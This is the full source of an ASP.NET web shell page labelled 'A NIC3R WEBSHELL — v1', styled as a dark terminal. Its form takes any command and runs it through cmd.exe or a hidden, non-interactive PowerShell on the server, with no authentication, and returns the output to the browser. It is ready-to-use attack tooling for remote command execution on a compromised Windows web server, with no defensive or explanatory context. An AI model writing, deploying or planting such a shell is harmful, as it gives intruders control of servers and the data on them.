<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<head>
<style>
    :root {
        --bg: #0a0c10;
        --surface: #0f1318;
        --surface2: #161b22;
        --border: #21262d;
        --accent: #f78166;
        --accent2: #79c0ff;
        --accent3: #56d364;
        --text: #c9d1d9;
        --muted: #6e7681;
        --mono: 'Share Tech Mono', monospace;
    }
    body { background: var(--bg); color: var(--text); font-family: var(--mono); padding: 2rem; margin: 0; }
    input[type=text] { background: var(--surface2); color: var(--accent2); border: 1px solid var(--border); padding: 6px 10px; width: 500px; font-family: var(--mono); font-size: 0.85rem; outline: none; }
    input[type=text]:focus { border-color: var(--accent2); }
    select { background: var(--surface2); color: var(--accent3); border: 1px solid var(--border); padding: 6px; font-family: var(--mono); font-size: 0.85rem; }
    input[type=submit] { background: var(--accent2); color: var(--bg); border: none; padding: 6px 14px; font-family: var(--mono); font-weight: bold; cursor: pointer; font-size: 0.85rem; }
    input[type=submit]:hover { background: var(--accent3); }
    pre { background: #010409; border: 1px solid var(--border); padding: 1.25rem; max-height: 500px; overflow-x: auto; overflow-y: scroll; white-space: pre; word-wrap: normal; margin-top: 1.5rem; color: var(--text); font-size: 0.82rem; line-height: 1.8; }
    .label { font-size: 0.7rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 1rem; }
</style>
</head>
<body>
<div class="label">// A NIC3R WEBSHELL &mdash; v1</div>
<form method="POST">
    <input type="text" name="cmd" size="60" autofocus placeholder="Enter command..." />
    <select name="shell">
        <option value="cmd">cmd</option>
        <option value="ps">PowerShell</option>
    </select>
    <input type="submit" value="Run" />
</form>
<%
    string cmd = Request.Form["cmd"];
    string shell = Request.Form["shell"] ?? "cmd";

    if(!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();

        if(shell == "ps") {
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.Arguments = "-Sta -Nop -NonInteractive -WindowStyle Hidden -Command " + cmd;
        } else {
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
        }

        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();
        Response.Write("<pre>" + Server.HtmlEncode(o) + "</pre>");
    }
%>
</body>
</html>
